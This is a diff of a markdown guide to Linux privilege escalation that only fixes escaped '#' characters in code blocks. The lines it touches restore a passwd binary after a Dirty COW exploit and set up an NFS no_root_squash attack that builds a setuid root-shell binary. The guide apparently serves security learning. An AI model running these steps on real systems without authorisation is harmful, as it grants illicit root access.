@@ -18,7 +18,7 @@ $./c0w
 It will take some time to build now in command prompt type **passwd** and voila we get the root shell. After expoit if you want to make the system normal you need to copy the backup passwd binary to /usr/bin directory.
 
 ```bash
-\#cp /tmp/bak /usr/bin/passwd
+#cp /tmp/bak /usr/bin/passwd
 ```
 
 ## Privilege Escalation - Stored Passwords
@@ -293,10 +293,10 @@ Find the NFS permission by using ```cat /etc/exports```, now find the exports by
 
 ```bash
 $mkdir /tmp/1
-\#mount -o rw,vers=2 ip:/tmp /tmp/1
-\#echo 'int main() {setuid(0); setgid(0); system("/bin/bash");}' > /tmp/1/x.c
-\#gcc /tmp/1/x.c -o /tmp/1/x
-\#chmod +s /tmp/1/x
+#mount -o rw,vers=2 ip:/tmp /tmp/1
+#echo 'int main() {setuid(0); setgid(0); system("/bin/bash");}' > /tmp/1/x.c
+#gcc /tmp/1/x.c -o /tmp/1/x
+#chmod +s /tmp/1/x
 ```
 
 In target machine run ```/tmp/x```
